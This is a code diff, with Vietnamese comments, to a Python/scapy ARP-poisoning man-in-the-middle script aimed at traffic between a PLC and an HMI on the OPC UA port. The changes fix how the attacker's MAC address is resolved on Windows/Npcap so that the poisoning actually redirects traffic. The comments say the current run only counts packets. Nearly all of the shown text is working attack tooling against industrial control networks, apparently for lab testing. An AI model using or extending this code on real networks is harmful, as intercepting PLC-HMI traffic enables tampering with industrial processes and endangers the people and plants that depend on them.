@@ -25,9 +25,49 @@ stop_flag = threading.Event()
 counts = {"total_4840": 0, "from_plc": 0, "from_hmi": 0, "poison_sent": 0}
 
 
-def get_mac(ip, iface, timeout=2):
+def _is_null_mac(mac):
+    return (not mac) or mac.lower() in ("00:00:00:00:00:00", "")
+
+
+def resolve_attacker_mac(iface, plc_ip):
+    """get_if_hwaddr(iface) tren Npcap/Windows hay tra ve MAC rong -- day la
+    bug da biet, xem tests/test_mitm_opcua_spoof.py's resolve_attacker_mac()
+    (ham nay copy lai y het logic do). Neu dung MAC rong lam hwsrc, ARP poison
+    quang bao "IP nay o MAC 00:00:00:00:00:00" -- vo nghia, nan nhan khong the
+    gui traffic ve dung may attacker => redirect luon la 0 goi bat ke ARP co
+    "gui duoc" hay khong."""
     try:
-        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=timeout, verbose=False, iface=iface)
+        mac = get_if_hwaddr(iface)
+        if not _is_null_mac(mac):
+            return mac, "get_if_hwaddr"
+    except Exception:
+        pass
+    try:
+        from scapy.all import conf
+        _, attacker_ip, _ = conf.route.route(plc_ip)
+        from scapy.arch.windows import get_windows_if_list
+        for i in get_windows_if_list():
+            if attacker_ip in (i.get("ips") or []) and not _is_null_mac(i.get("mac")):
+                return i["mac"], f"windows_if_list(ip={attacker_ip})"
+    except Exception:
+        pass
+    try:
+        from scapy.all import conf
+        mac = getattr(conf.iface, "mac", None)
+        if not _is_null_mac(mac):
+            return mac, "conf.iface.mac"
+    except Exception:
+        pass
+    return None, "FAILED"
+
+
+def get_mac(ip, timeout=2):
+    # KHONG truyen iface= vao srp() -- da xac nhan qua tests/test_mitm_opcua_spoof.py
+    # rang tren Windows/Npcap, truyen iface= tuong minh vao srp() lam ARP request/
+    # reply khong khop dung interface va luon that bai; de scapy tu chon interface
+    # mac dinh lai hoat dong dung.
+    try:
+        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=timeout, verbose=False)
         return ans[0][1].hwsrc if ans else None
     except Exception as e:
         print(f"[!] get_mac({ip}) loi: {e}")
@@ -76,19 +116,19 @@ def main():
     args = p.parse_args()
 
     print(f"[*] Resolving MAC: PLC={args.plc}  HMI={args.hmi}  iface={args.iface}")
-    plc_mac = get_mac(args.plc, args.iface)
-    hmi_mac = get_mac(args.hmi, args.iface)
+    plc_mac = get_mac(args.plc)
+    hmi_mac = get_mac(args.hmi)
     print(f"    PLC MAC = {plc_mac}")
     print(f"    HMI MAC = {hmi_mac}")
     if not plc_mac or not hmi_mac:
         print("[!] Khong resolve duoc MAC -- dung lai. Kiem tra IFACE dung chua, may co ket noi mang do khong.")
         return
 
-    attacker_mac = get_if_hwaddr(args.iface)
-    print(f"[*] Attacker MAC (get_if_hwaddr) = {attacker_mac}")
-    if not attacker_mac or attacker_mac.lower() == "00:00:00:00:00:00":
-        print("[!] CANH BAO: attacker MAC RONG -- ARP poison se quang bao MAC rong, chac chan KHONG redirect duoc.")
-        print("    (Neu may nay la VM: kiem tra dung interface bridged/physical, khong phai NAT/virtual switch rieng.)")
+    attacker_mac, mac_method = resolve_attacker_mac(args.iface, args.plc)
+    print(f"[*] Attacker MAC = {attacker_mac}  (resolve qua: {mac_method})")
+    if _is_null_mac(attacker_mac):
+        print("[!] CANH BAO: khong resolve duoc MAC hop le bang bat ky cach nao -- dung lai, kiem tra IFACE.")
+        return
 
     print(f"\n[*] Bat dau poison trong {args.duration}s, dong thoi dem goi TCP:4840 giua PLC<->HMI lot qua iface nay...")
     print("    (Khong sua gi ca -- day chi la dem, de tach bach loi ARP khoi loi parse OPC UA)\n")
